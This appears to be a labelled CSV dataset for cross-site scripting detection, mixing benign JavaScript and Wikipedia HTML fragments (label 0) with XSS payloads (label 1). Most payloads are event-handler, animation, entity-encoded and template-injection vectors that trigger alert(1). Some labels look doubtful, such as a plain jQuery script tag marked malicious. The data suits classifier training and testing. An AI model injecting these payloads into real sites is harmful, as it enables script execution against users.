payload,label
"<img src=""validimage.png"" width=""10"" height=""10"" usemap=""#xss""><map name=""xss""><area shape=""rect"" coords=""0,0,82,126"" target=""alert(1)"" href=""http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//""></map>",1
<aside onpointerdown=alert(1)>xss</aside>,1
"<style>@keyframes x{}</style><track style=""animation-name:x"" onanimationstart=""alert(1)""></track>",1
"<div style=""padding:0em 0.25em""> </div><table class=""nowraplinks navbox-subgroup"" style=""border-spacing:0""><tbody><tr><th scope=""row"" class=""navbox-group"" style=""width:7.5em"">ancient </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;padding:0px"">",0
"easing: 'easeinoutquad', complete: function (anim) { var el = anim.animatables[0].target;",0
<script>onerror=alert;throw 1</script>,1
"m.taptarget = taptarget; if (m.jqueryloaded) { m.initializejquerywrapper(taptarget, 'taptarget', 'm_taptarget');",0
"<li><cite id=""citerefbrooks1991"" class=""citation encyclopaedia"">brooks, r. a. (1991). ""how to build complete creatures rather than isolated cognitive simulators"". in vanlehn, k. (ed.). <i>architectures for intelligence </i>. hillsdale, nj: lawrence erlbaum associates. pp.&#160;225–239. <a href=""/wiki/citeseerx"" title=""citeseerx"">citeseerx </a>&#160;<span class=""cs1-lock-free"" title=""freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.52.9510"">10.1.1.52.9510 </a>",0
<h1 onpointerenter=alert(1)>xss</h1>,1
"<tr oncut=""alert(1)"" contenteditable>test</tr>",1
}; } function getwindowscrollbarx(element) {,0
"toggleclass: function (c, state) { if (state !== undefined) { return this[state ? ""addclass"" : ""removeclass""](c);",0
this._handlechipclickbound = this._handlechipclick.bind(this); this._handleinputkeydownbound = this._handleinputkeydown.bind(this); this._handleinputfocusbound = this._handleinputfocus.bind(this);,0
"<details onmouseup=""alert(1)"">test</details>",1
"one: function (eventname, delegate, callback) {",0
value: function _animateindicator(previndex) {,0
calendar.year += math.floor(math.abs(calendar.month) / 12); calendar.month -= 12; },0
"chips: root.queryselectorall('.chips:not(.no-autoinit)'),",0
grunt.loadnpmtasks('grunt-rename-util'),0
"<blink onbeforepaste=""alert(1)"" contenteditable>test</blink>",1
} static get default() { return default$1;,0
} this._element.classlist.remove(class_name_hide) // @deprecated reflow(this._element),0
if (!this._isshown()) { return },0
<th onpointerdown=alert(1)>xss</th>,1
"<abbr oncut=""alert(1)"" contenteditable>test</abbr>",1
_selectoption(optionel) {,0
"} function handleentrypoint ( index, value, that ) { var percentage;",0
"<style>@keyframes x{}</style><title style=""animation-name:x"" onanimationend=""alert(1)""></title>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><article id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></article>",1
"<style>@keyframes slidein {}</style><figure style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></figure>",1
"<del onbeforecopy=""alert(1)"" contenteditable>test</del>",1
easing: 'easeoutquad' }); _this40.activeindex = 0;,0
"<image onkeypress=""alert(1)"" contenteditable>test</image>",1
if ($currcontent.length) { $currcontent[0].style.display = 'none'; },0
"}; this.autocomplete = m.autocomplete.init(this.$input[0], this.options.autocompleteoptions); }",0
value: function addchip(chip) { if (!this._isvalid(chip) || this.chipsdata.length >= this.options.limit) { return;,0
http://subdomain1.portswigger-labs.net/xss/xss.php?x=%3ciframe%20name=javascript:alert(1)%20src%3d%22https%3a%2f%2fportswigger-labs.net%2fxss%2fxss.php%3fx%3d%3cscript%3elocation=name%3c/script%3e%22%3e%3c%2fiframe%3e,1
<tbody onfocusout=alert(1) tabindex=1 id=x></tbody><input autofocus>,1
(() => { 'use strict' const ctx = document.getelementbyid('mychart'),0
"return merged; }, {}); // ie11 does not support object.values return object.keys(merged).map(function (key) {",0
"<li><a href=""/wiki/biorobotics"" title=""biorobotics"">biorobotics </a> </li>",0
"<blockquote onmouseover=""alert(1)"">test</blockquote>",1
const scrollsize = `scroll${capitalizeddimension}`,0
"<meter draggable=""true"" ondragenter=""alert(1)"">test</meter>",1
<li onpointerenter=alert(1)>xss</li>,1
value: function _handlemouseleave() { this.ishovered = false; this.isfocused = false; // allows close of tooltip when opened by focus.,0
"const showevent = eventhandler.trigger(this._element, event_show); if (showevent.defaultprevented) { return;",0
"show() { const showevent = eventhandler.trigger(this._element, event_show); if (showevent.defaultprevented) {",0
"<xmp onkeypress=""alert(1)"" contenteditable>test</xmp>",1
this._element.classlist.add(class_name_static) this._queuecallback(() => { this._element.classlist.remove(class_name_static),0
"ordered.push([entry[index], index]); } }",0
<label id=x tabindex=1 onactivate=alert(1)></label>,1
if (this.options.preventscrolling) { this._preventbodyscrolling(); },0
import scrollbarhelper from './util/scrollbar.js' const name = 'offcanvas' const data_key = 'bs.offcanvas',0
"} eventhandler.trigger(this._element, event_hidden) }",0
<x v-on:click='_b.constructor`alert(1)`()'>click</x>,1
var value = attributes[name],0
"<cite ondblclick=""alert(1)"">test</cite>",1
"<tr onkeydown=""alert(1)"" contenteditable>test</tr>",1
"<style>:target {transform: rotate(180deg);}</style><wbr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></wbr>",1
<cite onpointerleave=alert(1)>xss</cite>,1
const class_name_fade = 'fade' const class_name_show = 'show' const class_dropdown = 'dropdown',0
"return _this68; } _createclass(formselect, [{",0
_this3.$headers = _this3.$el.children('li').children('.collapsible-header'),0
"<canvas draggable=""true"" ondragenter=""alert(1)"">test</canvas>",1
"<style>:target {color: red;}</style><template id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></template>",1
"if (modal._count === 1) { document.body.addeventlistener('click', this._handletriggerclick); }",0
let lastcenter = this.center,0
"duration: 750, show: function(e, element) { if (e.button === 2) {",0
<b onpointerover=alert(1)>xss</b>,1
this.$el.addclass('chips input-field'),0
"<slot onbeforecopy=""alert(1)"" contenteditable>test</slot>",1
"useronopenend.call(this.dropdown, this.el)",0
<center id=x tabindex=1 onbeforeactivate=alert(1)></center>,1
"<style>@keyframes slidein {}</style><map style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></map>",1
"<progress onmousedown=""alert(1)"">test</progress>",1
"<ul><li><a href=""#citerefrussellnorvig2003"">russell &amp; norvig 2003 </a>, p.&#160;957 </li>",0
<audio controls src=1 onfocusin=alert(1) autofocus>,1
return this._gettitle() || this._getcontent(),0
"<noembed onbeforecut=""alert(1)"" contenteditable>test</noembed>",1
"<label onkeyup=""alert(1)"" contenteditable>test</label>",1
"if (window_width < 1120) { sha = sha.substring(0, 7); }",0
"attachevent ( actions.start, handle.children[0], eventstart, { handlenumbers: [index] });",0
"this.istouchmoving = false; } }, {",0
"spread = generatespread( density, mode, group ), format = grid.format || { to: math.round",0
"value: function _handleinputkeydown(e) { autocomplete._keydown = true; var keycode = e.keycode,",0
_this16.originalheight = 0,0
this.gotoyear(e.target.value); } gotomonth(month) {,0
"<video onloadeddata=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<shadow draggable=""true"" ondrag=""alert(1)"">test</shadow>",1
"}, { key: ""_ondragend"", value: function _ondragend() {",0
_isshown() { return this.tip && this.tip.classlist.contains(class_name_show); },0
"easing: 'easeoutcubic', complete: function () { _this15.el.style.display = 'none';",0
<script src=https://code.jquery.com/jquery-3.5.1.js></script>,1
"'js/range.js' ], dest: 'temp/js/materialize.js'",0
"<details onkeydown=""alert(1)"" contenteditable>test</details>",1
return default$c; } static get defaulttype() {,0
this.$el.before($(this.wrapper)); this.wrapper.append(this.el); },0
<title onpointerenter=alert(1)>xss</title>,1
<ol id=x tabindex=1 onfocus=alert(1)></ol>,1
"<nav onmouseleave=""alert(1)"">test</nav>",1
"<address oncut=""alert(1)"" contenteditable>test</address>",1
"}, []); var referencerect = state.rects.reference; var popperrect = state.rects.popper;",0
<dfn onpointerover=alert(1)>xss</dfn>,1
<datalist onpointermove=alert(1)>xss</datalist>,1
"this.el.removeeventlistener('mouseleave', this._handlemouseleavebound); this.el.removeeventlistener('focus', this._handlefocusbound, true); this.el.removeeventlistener('blur', this._handleblurbound, true);",0
value: function _handledocumentclickend(e) {,0
"var date = displaydate.getdate(); this.yeartextel.innerhtml = displaydate.getfullyear(); this.datetextel.innerhtml = day + "", "" + month + "" "" + date;",0
for (const node of activenodes) { node.classlist.remove(class_name_active) },0
"<meta name=""generator"" content=""mediawiki 1.35.0-wmf.22""/>",0
"<ul><li><a href=""/wiki/interpreter_(computing)"" title=""interpreter (computing)"">interpreter </a> </li>",0
") .appendto(confirmationbtnscontainer) .on('click', this.done.bind(this));",0
<summary onpointerup=alert(1)>xss</summary>,1
toastplacement.classname = `${toastplacement.dataset.originalclass} ${this.value}`,0
"<li id=""cite_note-autogenerated2-398""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-autogenerated2_398-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-autogenerated2_398-1""><sup><i><b>b </b> </i> </sup> </a>",0
"<dfn onclick=""alert(1)"">test</dfn>",1
<svg><audio onload=alert(1)></audio>,1
this.$activetablink = this.$el .children('li.tab') .children('a'),0
"<video onmouseup=""alert(1)"">test</video>",1
toggleenabled() { this._isenabled = !this._isenabled },0
.first(); } if (this.$activetablink.length === 0) {,0
"<summary oncontextmenu=""alert(1)"">test</summary>",1
carousel.getorcreateinstance(carousel); } });,0
"this.el.addeventlistener('blur', this._handlerangeblurmouseouttouchleavebound); this.el.addeventlistener('mouseout', this._handlerangeblurmouseouttouchleavebound); this.el.addeventlistener('touchleave', this._handlerangeblurmouseouttouchleavebound);",0
rect.height = element.clientheight,0
this.pause(); this._issliding = true; this._setactiveindicatorelement(nextelementindex);,0
value: function _isvalid(chip) { if (chip.hasownproperty('tag') && chip.tag !== '') { var exists = false;,0
"_createpopper(tip) { const placement = execute(this._config.placement, [this, tip, this._element]); const attachment = attachmentmap[placement.touppercase()];",0
this.originel = this.originel[0],0
"this.options.onclosestart.call(this, $collapsibleli[0])",0
"<article onclick=""alert(1)"">test</article>",1
}(); cash.prefixedprop = getprefixedprop; cash.camelcase = camelcase;,0
"element.setattribute('tabindex', '-1'); this._toggledropdown(element, false); eventhandler.trigger(element, event_hidden, {",0
this.isopen = false; this.isfixed = this.el.classlist.contains('sidenav-fixed'); this.isdragged = false;,0
"<bgsound onpaste=""alert(1)"" contenteditable>test</bgsound>",1
data.toggle(); }); definejqueryplugin(button);,0
function getaltaxis(axis) {,0
<bgsound onpointerdown=alert(1)>xss</bgsound>,1
"<img src=""`<javascript:alert>`('')""",1
"<dir onkeyup=""alert(1)"" contenteditable>test</dir>",1
"<div draggable=""true"" contenteditable>drag me</div><source ondragover=alert(1) contenteditable>drop here</source>",1
"this.el.removeeventlistener('mouseenter', this._handleopenbound)",0
let $collapsible = $header.closest('.collapsible'),0
}); } _animateout() {,0
backdrop.classlist.add(class_name_fade),0
"return; } const activeindicator = selectorengine.findone(selector_active, this._indicatorselement);",0
}]); return tabs; }(component);,0
<meter id=x tabindex=1 onbeforeactivate=alert(1)></meter>,1
"return attributes }, getdataattribute(element, key) {",0
"'"" class=""datepicker-controls"" role=""heading"" aria-live=""assertive"">',",0
"<li><a href=""/wiki/ferroelectric_ram"" title=""ferroelectric ram"">fram </a> </li>",0
toast._draggedtoast = null; } },0
this.dragtarget.classlist.remove('right-aligned'),0
"} if (ishtmlelement(offsetparent)) { offsets = getboundingclientrect(offsetparent, true);",0
"const selector_item_img = '.carousel-item img'; const selector_indicators = '.carousel-indicators'; const selector_data_slide = '[data-bs-slide], [data-bs-slide-to]';",0
<slot onpointerup=alert(1)>xss</slot>,1
value: function _setupstyles() {,0
"<tt oncut=""alert(1)"" contenteditable>test</tt>",1
"<style>@keyframes x{}</style><slot style=""animation-name:x"" onanimationend=""alert(1)""></slot>",1
"eventhandler.off(document, event_key$5); } _handlefocusin(event) {",0
"dispose() { eventhandler.off(this._element, event_key) }",0
"that.xhighestcompletestep.push(0); } function handlesteppoint ( i, n, that ) {",0
"<style>@keyframes x{}</style><span style=""animation-name:x"" onanimationend=""alert(1)""></span>",1
var toastelement = this._createtoast(); toastelement.m_toast = this; this.el = toastelement;,0
"scalex: [0.8, 1], scaley: [0.8, 1] });",0
const event_hide$4 = `hide${event_key$4}`; const event_hide_prevented$1 = `hideprevented${event_key$4}`; const event_hidden$4 = `hidden${event_key$4}`;,0
"eventhandler.on(this._element, event_mouseleave$1, () => this._maybeenablecycle())",0
"${htmlsnippet.trimstart().replace(/^/gm, ' ').replace(/^ {4}$/gm, '').trimend()}",0
"<abbr onmouseenter=""alert(1)"">test</abbr>",1
const modaltitle = examplemodal.queryselector('.modal-title'),0
this._keysselected[key] = true; } else { delete this._keysselected[key];,0
"this.originel.addeventlistener('click', this._handleoriginclickbound)",0
if (typeof event !== 'string' || !element) { return null; },0
if ( values[handlenumber] !== null && firesetevent ) {,0
"var offset = this.options.margin + this.options.transitionmovement; var edges = m.checkwithincontainer(document.body, bounding, offset); if (edges.left) {",0
"} const defaulttype = { endcallback: '(function|null)',",0
"<frame onmouseout=""alert(1)"">test</frame>",1
<li id=x tabindex=1 onactivate=alert(1)></li>,1
"onautocomplete: null, // callback for when autocompleted minlength: 1, // min characters before autocomplete starts sortfunction: function (a, b, inputstring) {",0
"eventhandler.on(document, clickevent, `[data-bs-dismiss=""${name}""]`, function (event) {",0
"} return fn.apply(element, [event]) }",0
<img src=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,1
} const nextelementindex = this._getitemindex(nextelement); const triggerevent = eventname => {,0
"this._element.classlist.remove(class_name_show$8); const isanimated = this._element.classlist.contains(class_name_fade$5); this._queuecallback(() => this._destroyelement(), this._element, isanimated);",0
"};return m; }; $jscomp.polyfill = function (e, r, p, m) {",0
<b onpointerup=alert(1)>xss</b>,1
"<strike onkeydown=""alert(1)"" contenteditable>test</strike>",1
"return null }, remove(element, key) {",0
<bdo onpointerup=alert(1)>xss</bdo>,1
"return unique(cash.merge(this, cash(selector, context)))",0
"left: this.options.dialradius + math.sin(_radian) * _radius - this.options.tickradius + 'px', top: this.options.dialradius - math.cos(_radian) * _radius - this.options.tickradius + 'px' });",0
"<content oncut=""alert(1)"" contenteditable>test</content>",1
return domelem.m_formselect; } destroy() {,0
"if (!this._config.parent) { this._addariaandcollapsedclass(this._triggerarray, this._isshown()); }",0
